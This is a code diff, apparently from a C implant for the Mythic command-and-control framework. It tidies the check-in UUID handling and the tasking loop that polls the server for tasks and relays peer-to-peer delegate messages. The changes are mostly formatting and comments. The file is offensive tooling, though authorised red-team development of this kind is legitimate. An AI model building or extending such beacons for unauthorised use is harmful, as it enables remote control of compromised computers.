@@ -303,14 +303,13 @@ BOOL TaskCheckin(PPARSER checkinResponseData)
 
     // Mythic sends a new UUID after the checkin, we need to update it
     SIZE_T sizeUuid = TASK_UUID_SIZE;
-    PCHAR tempUUID = ParserGetString(checkinResponseData, &sizeUuid);
+    PCHAR tempUUID = ParserGetString(checkinResponseData, &sizeUuid);           // ToDo use ParserStringCopy
 
     // Allocate memory for newUUID and copy the UUID string
     PCHAR newUUID = (PCHAR)malloc(sizeUuid + 1);  // +1 for the null terminator
     if (newUUID == NULL) {
         goto end;
     }
-    
     memcpy(newUUID, tempUUID, sizeUuid);  // Copy UUID bytes
     newUUID[sizeUuid] = '\0';             // Null-terminate the string
 
@@ -361,22 +360,24 @@ VOID TaskProcess(PPARSER tasks)
 
 VOID TaskRoutine()
 {
-    // Create package to ask for new tasks
-    PPackage req = PackageInit(GET_TASKING, TRUE);
+    /* Ask server for new tasks */
+    PARSER   tasks   = { 0 };
+    PPackage req     = PackageInit(GET_TASKING, TRUE);
+    
     PackageAddInt32(req, NUMBER_OF_TASKS);
 
-    /* Send get_tasking message to server */
-    PARSER  tasks   = { 0 };
-    BOOL    bStatus = PackageSend(req, &tasks);
-    if (bStatus == FALSE || tasks.Buffer == NULL) {
+    BOOL bStatus = PackageSend(req, &tasks);
+    
+    if (bStatus == FALSE || tasks.Buffer == NULL)
         goto CLEANUP;
-    }
 
 
     /* Check response for Delegate msgs */
     BOOL isDelegates        = (BOOL)ParserGetByte(&tasks);
     _dbg("isDelegates : %s", isDelegates ? "TRUE" : "FALSE");
+
 #if defined(INCLUDE_CMD_LINK)
+
     PCHAR  P2pUuid          = NULL;
     PCHAR  P2pMsg           = NULL;
     SIZE_T P2pIdLen         = 0;
@@ -397,16 +398,19 @@ VOID TaskRoutine()
         // TODO Don't allocate for this
         if (P2pMsg) LocalFree(P2pMsg);
     }
+
 #endif
 
 
-    /* Process all tasks, tasks send responses to Server */ 
+    /* Process all tasks */ 
     TaskProcess(&tasks);
 
 
     /* Check all Links and push delegates to Server */
 #if defined(INCLUDE_CMD_LINK)
+
     LinkPush();
+    
 #endif
 
 
